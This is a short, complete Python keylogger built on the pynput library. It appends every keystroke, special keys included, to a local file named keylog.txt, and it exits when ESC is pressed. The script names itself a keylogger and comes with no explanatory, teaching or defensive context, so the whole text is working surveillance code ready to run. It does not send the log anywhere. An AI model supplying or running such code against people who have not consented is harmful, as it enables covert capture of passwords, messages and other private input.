from pynput import keyboard

# File to store keystrokes
log_file = "keylog.txt"

# Function to write key to file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Exit on pressing ESC key
def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
